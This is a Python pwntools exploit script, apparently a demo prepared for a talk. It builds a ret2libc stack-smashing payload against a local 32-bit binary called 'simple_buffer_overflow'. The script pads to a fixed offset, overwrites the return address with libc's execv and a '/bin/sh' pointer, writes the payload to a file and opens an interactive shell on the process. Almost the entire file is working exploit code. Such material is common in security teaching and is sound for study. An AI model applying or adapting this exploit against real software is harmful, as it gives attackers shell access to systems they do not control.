# take filename as argument
# take desired fn name as argument
# take sequence length as arg default 50
import argparse
from pwn import *

simple_elf=ELF("simple_buffer_overflow")
# local_system=simple_elf.symbols["system"]
print("simple_elf_addr", hex(simple_elf.address))
# print("local_system", hex(local_system))

libc=ELF("/lib32/libc.so.6")
libc_system_addr=libc.symbols["execv"]
libc_addr=0xf7af6000#libc.address

bin_sh_addr=next(libc.search(b"/bin/sh"))

print("libc_addr_manual", hex(libc_addr))
print("libc_addr_elf", hex(libc.address))
print("libc_system_addr", hex(libc_system_addr))
print("bin_sh_addr", hex(bin_sh_addr))
print("libc_addr + libc_system_addr", hex(libc_addr + libc_system_addr))
print("libc_addr + bin_sh_addr", hex(libc_addr + bin_sh_addr))

parser = argparse.ArgumentParser()
parser.add_argument("exe", help="Executable name")

args = parser.parse_args()
exe = args.exe

# second round with offset from ip
smashoffset = 62#cyclic_find(user_input)
print("smash offset: ", smashoffset)
g=cyclic_gen()

sh = process(exe)
gdb_smash = gdb.attach(
sh,
gdbscript='break *0x080491a9', 
)

fake_return_address=0xdeadbeef

# this and system should be calculated from offset
# but bear in mind that this might be already enough for tektalk
# dont have to hack the world at once
# user_input = input("leaked libc addr\n")
# address=int(user_input,16)

smasher = g.get(smashoffset) + p32(libc_addr + libc_system_addr) + p32(fake_return_address) + p32(libc_addr + bin_sh_addr)
print("Trying to smash stack with: ", smasher, "length: ", smashoffset)

with open('payload.txt', 'wb') as fw:
    fw.write(smasher)

sh.sendline(smasher)
sh.interactive()
sh.close()
